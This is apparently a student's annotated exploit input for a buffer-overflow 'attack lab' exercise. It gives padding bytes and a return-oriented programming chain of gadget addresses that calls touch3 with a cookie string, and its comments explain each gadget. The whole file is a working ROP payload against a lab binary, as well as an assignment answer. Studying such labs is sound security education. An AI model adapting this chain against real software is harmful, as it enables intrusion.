/* In phase3, I used 0x90 == no op for "NO-OP sled". However, we're not "injecting code", so
   there's no need to use 90 (although I suppose you could). Instead, I replaced 90 with 00 and filled the entire buffer (all 56 bytes) with it. */
/* "ea 20 40 00 00 00 00 00" little endian address is location of overwritten return address of phase 2 which is now the memory address in text of gadget 1. */
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 /* Buffer size == 56 bytes for me. Fill up buffer with padding and place gadget 1 address in memory location of return address which we previously overwrote in phase 2 with address into the buffer to execute injected code. */
ea 20 40 00 00 00 00 00 /* gadget 1: movq %rsp to %rax ==> text address 0x4020e8 + 2 bytes == 0x4020ea */
b0 1f 40 00 00 00 00 00 /* gadget 2: "move %rax to %rdi" ==> text address 0x401fae+2 bytes == 0x401fb0 */
fa 1f 40 00 00 00 00 00 /* gadget 3: "pop %rax" ==> text address */
48 00 00 00 00 00 00 00 /* 0x48 == 72 in decimal. Need this here b/c "*(rdi) + 72) == address of my cookie value below" and gadget 3 will pop this number into %rax which eventually ends up in %esi by using gadgets 4 - 6. With this, add_xy will perform "*(rdi) + 72)" which is returned in rax and put in %rdi in gadget 2/line 19 below. This sets up calling touch3() with the correct argument. */
8d 20 40 00 00 00 00 00 /* gadget 4: movl %eax, %edx */
24 20 40 00 00 00 00 00 /* gadget 5: movl %edx, %ecx */ 
2e 20 40 00 00 00 00 00 /* gadget 6: movl %ecx, %esi */ 
09 20 40 00 00 00 00 00 /* add_xy function */
b0 1f 40 00 00 00 00 00 /* gadget 2: "move %rax to %rdi" ==> text address 0x401fae+2 bytes == 0x401fb0 */
fb 1e 40 00 00 00 00 00 /* touch 3 function address */
36 35 64 34 37 31 62 35 /* cookie ascii value */
00 00 00 00 00 00 00 00 /* provides a null terminator for cookie ascii string above */

/*
40208b + 2 == 40208d // 89 c2 @ line 113: NOT sure about this one "92" byte is in between 89 c2 and c3.
                     // UPDATE: It works! Apparently, "92" opcode does nothing!
402021 + 3 == 402024 // 89 d1 @ line 63: This one should work b/c 90 is only byte between 89 d1 and c3.
40202c + 2 == 40202e // 89 ce @ line 68: REALLY NOT sure about this one. It has "78 c0" between 89 ce and c3.
                     // UPDATE: It works! "78 c0" doesn't seem to be a valid op code. 
b5 71 d4 65 00 00 00 00 // cookie ascii value, 36 35 64 34 37 31 62 35 00 
d6 1d 40 00 00 00 00 00 // touch2 address of 00 40 1d d6 
*/